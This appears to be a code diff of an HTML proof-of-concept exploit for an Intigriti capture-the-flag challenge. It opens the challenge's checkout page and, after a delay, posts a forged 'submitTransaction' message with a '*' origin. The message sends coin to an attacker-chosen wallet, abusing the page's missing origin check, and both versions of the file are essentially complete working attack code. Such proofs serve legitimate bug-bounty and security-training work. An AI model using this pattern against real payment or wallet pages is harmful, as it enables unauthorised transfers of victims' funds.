@@ -1,42 +1,32 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>PostMessage Logic Abuse – PoC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC</title>
 </head>
 <body>
+    <script>
+        const challengeUrl = 'https://challenge-0126.intigriti.io';
+        const currency = '1337COIN'; 
+        const yourAddress = "VeryHacker";
+        const amount = 3; 
 
-<script>
-/*
-  Preconditions:
-  - Victim logged in
-  - Target page listens to postMessage
-  - No origin validation
-*/
+        const checkoutWindow = window.open(challengeUrl + '/checkout.html?currency=' + currency + '&price=1');
 
-// افتح صفحة checkout
-const win = window.open(
-  "https://challenge-0126.intigriti.io/checkout.html?currency=1337coin&price=150",
-  "_blank"
-);
-
-// استنى الصفحة تجهز
-setTimeout(() => {
-
-  // الرسالة الحساسة
-  win.postMessage({
-    type: "submitTransaction",
-    transaction: {
-      toAddress: "ATTACKER_WALLET",
-      currency: "1337coin",
-      amount: 1
-    }
-  }, "*");
-
-  console.log("[+] submitTransaction sent");
-
-}, 3000);
-</script>
-
+        setTimeout(() => {
+            checkoutWindow.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: yourAddress, 
+                    currency: currency,
+                    amount: amount
+                }
+            }, '*');
+                        setTimeout(() => {
+                checkoutWindow.close();
+            }, 2000);
+        }, 10000); 
+    </script>
 </body>
 </html>
